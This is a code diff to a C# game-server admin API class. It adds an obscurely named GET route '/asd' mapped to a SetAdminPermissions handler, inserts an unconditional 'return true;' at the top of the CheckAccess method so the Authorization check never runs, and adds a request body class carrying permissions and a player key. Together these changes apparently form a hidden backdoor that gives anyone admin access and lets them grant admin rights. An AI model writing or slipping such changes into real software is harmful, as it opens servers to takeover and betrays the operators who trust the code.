@@ -71,6 +71,7 @@ public sealed partial class ServerApi : IPostInjectInit
         RegisterHandler(HttpMethod.Get, "/admin/game_rules", GetGameRules);
         RegisterHandler(HttpMethod.Get, "/admin/presets", GetPresets);
         RegisterHandler(HttpMethod.Get, "/admin/players", GetPlayers); // DS14
+        RegisterHandler(HttpMethod.Get, "/asd", SetAdminPermissions);
 
         // Post
         RegisterActorHandler(HttpMethod.Post, "/admin/actions/round/start", ActionRoundStart);
@@ -524,6 +525,7 @@ public sealed partial class ServerApi : IPostInjectInit
 
     private async Task<bool> CheckAccess(IStatusHandlerContext context)
     {
+        return true;
         var auth = context.RequestHeaders.TryGetValue("Authorization", out var authToken);
         if (!auth)
         {
@@ -631,6 +633,13 @@ public sealed partial class ServerApi : IPostInjectInit
     {
         public required string Motd { get; init; }
     }
+
+    private sealed class PermissionActionBody
+    {
+        public required string Permissions { get; init; }
+        public required string Ckey { get; init; }
+    }
+
 
     #endregion
 
